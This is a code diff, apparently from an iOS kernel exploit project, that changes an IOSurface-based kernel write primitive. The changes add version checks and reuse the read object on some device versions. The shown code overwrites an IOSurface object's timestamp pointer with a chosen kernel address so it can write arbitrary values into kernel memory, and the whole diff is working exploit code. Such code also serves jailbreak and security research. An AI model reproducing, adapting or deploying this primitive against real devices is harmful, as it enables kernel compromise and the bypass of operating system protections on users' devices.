@@ -12,6 +12,9 @@ io_connect_t g_surfaceConnect = 0;
 
 void kwrite_IOSurface_init(struct kfd* kfd)
 {
+    if(kfd->info.env.vid <= 5)
+        return;
+    
     kfd->kwrite.krkw_maximum_id = 0x4000;
     kfd->kwrite.krkw_object_size = 0x400; //estimate
     
@@ -25,6 +28,9 @@ void kwrite_IOSurface_init(struct kfd* kfd)
 
 void kwrite_IOSurface_allocate(struct kfd* kfd, uint64_t id)
 {
+    if(kfd->info.env.vid <= 5)
+        return;
+    
     struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
     
     IOSurfaceFastCreateArgs args = {0};
@@ -33,11 +39,14 @@ void kwrite_IOSurface_allocate(struct kfd* kfd, uint64_t id)
     
     args.IOSurfacePixelFormat = IOSURFACE_MAGIC;
     
-    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
+    objectStorage[id].port = create_surface_fast_path(kfd, g_surfaceConnect, &objectStorage[id].surface_id, &args);
 }
 
 bool kwrite_IOSurface_search(struct kfd* kfd, uint64_t object_uaddr)
 {
+    if(kfd->info.env.vid <= 5)
+        return true;
+    
     uint32_t magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
     if (magic == IOSURFACE_MAGIC) {
         uint64_t id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
@@ -88,9 +97,15 @@ void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, uint64_t kaddr, uint64_t new_v
     uint64_t iosurface_uaddr = 0;
     struct iosurface_obj krwObject = { 0 };
     
-    iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
-    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
-    krwObject = objectStorage[kfd->kwrite.krkw_object_id];
+    if(kfd->info.env.vid <= 5) {
+        iosurface_uaddr = kfd->kread.krkw_object_uaddr;
+        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
+        krwObject = objectStorage[kfd->kread.krkw_object_id];
+    } else {
+        iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
+        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
+        krwObject = objectStorage[kfd->kwrite.krkw_object_id];
+    }
     
     uint64_t backup = dynamic_uget(IOSurface, IndexedTimestampPtr, iosurface_uaddr);
     dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, kaddr);
